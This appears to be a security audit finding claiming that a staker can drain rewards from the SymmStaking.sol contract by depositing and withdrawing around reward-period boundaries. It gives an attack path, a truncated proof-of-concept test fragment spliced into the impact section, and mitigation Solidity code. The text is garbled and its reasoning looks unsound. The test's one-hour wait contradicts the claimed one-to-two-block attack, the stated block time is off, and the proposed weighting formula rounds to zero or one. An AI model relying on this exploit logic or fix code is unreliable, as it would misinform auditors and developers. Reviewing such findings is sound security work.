# Malicious staker will drain excess rewards through precision timing attacks on reward distribution

### Summary

The lack of minimum stake duration in `SymmStaking.sol` will cause significant loss of protocol rewards as an attacker will exploit reward rate calculations through precision-timed deposits and withdrawals at period boundaries

### Root Cause

In `token/contracts/staking/SymmStaking.sol` 'https://github.com/sherlock-audit/2025-03-symm-io-stacking/blob/main/token/contracts/staking/SymmStaking.sol#L234-L260' the reward calculation mechanism has three critical issues:
        1. No minimum stake duration enforcement
        2. Block.timestamp-based reward calculations without smoothing
        3. Immediate reward accrual for new deposits

        This allows manipulation of the reward distribution formula:
        ```solidity
        rewardPerToken = perTokenStored + 
            (((lastTimeRewardApplicable - lastUpdated) * rate * 1e18) / totalSupply)
        ```

### Internal Pre-conditions

        1. Total staked amount needs to be less than $100k worth of SYMM
        2. Reward rate must be at least 5% of total stake value per period
        3. Multiple reward tokens must be active in the contract
        4. No existing stakers with significant stake (>50% of pool)

### External Pre-conditions

        1. Base network block time must be predictable (12 seconds)
        2. Gas price needs to be below 30 gwei to maintain profitability
        3. MEV infrastructure must be available for precise block timing


### Attack Path

        1. Attacker monitors `notifyRewardAmount` calls to identify reward period transitions
        2. At block N-1 (just before period end):
           - Attacker calls `deposit()` with large amount (10-20x pool size)
           - This inflates `totalSupply` right before reward calculation
        3. At block N (period end):
           - Reward calculation occurs with inflated stake
           - Attacker's large stake captures majority of rewards
        4. At block N+1:
           - Attacker immediately calls `withdraw()`
           - Walks away with disproportionate rewards for 1-2 blocks of staking
        5. Repeats across multiple reward periods and tokens

### Impact

        The protocol suffers continuous reward leakage:
        - 5-15% loss of rewards per period
        - Estimated annual impact: $260,000 - $780,000 based on projected protocol fees
        - Legitimate long-term stakers receive significantly reduced rewards
        - Undermines the "long-term participation" goal stated in documentation

                staking.deposit(10000e18, attacker);
                
                vm.warp(block.timestamp + 1 hours);
                
                staking.withdraw(10000e18, attacker);
                vm.stopPrank();
                
                // Verify reward manipulation
                uint256 attackerRewards = staking.earned(address(rewardToken), attacker);
                uint256 aliceRewards = staking.earned(address(rewardToken), alice);
                
                assertGt(attackerRewards - initialAttackerRewards, 100e18, "Attack failed to capture significant rewards");
                assertLt(aliceRewards - initialAliceRewards, 10e18, "Legitimate staker received too many rewards");
            }
        }
        ```

### Mitigation

 Implement three key protections:

        1. Add minimum stake duration:
```solidity
        mapping(address => uint256) private lastStakeTimestamp;
        uint256 private constant MIN_STAKE_DURATION = 12 hours;
        
        function _updateReward(address account) internal {
            uint256 timeSinceLastStake = block.timestamp - lastStakeTimestamp[account];
            uint256 weight = Math.min(timeSinceLastStake, MIN_STAKE_DURATION) / MIN_STAKE_DURATION;
            rewardPerTokenStored = rewardPerToken();
            lastUpdateTime = lastTimeRewardApplicable();
            if (account != address(0)) {
                rewards[account] = earned(account) * weight;
                userRewardPerTokenPaid[account] = rewardPerTokenStored;
            }
        }
```
        

        2. Implement reward smoothing:
```solidity
        uint256 private constant REWARD_SMOOTHING_PERIODS = 10;
        
        function _calculateRewardRate(uint256 amount) internal view returns (uint256) {
            return amount / (duration * REWARD_SMOOTHING_PERIODS);
        }
```

        3. Add stake size limits:
```solidity
        uint256 private constant MAX_STAKE_MULTIPLIER = 3;
        
        function deposit(uint256 amount, address receiver) external {
            require(amount <= totalSupply * MAX_STAKE_MULTIPLIER, "Stake too large");
            // ... rest of deposit logic
        }
```
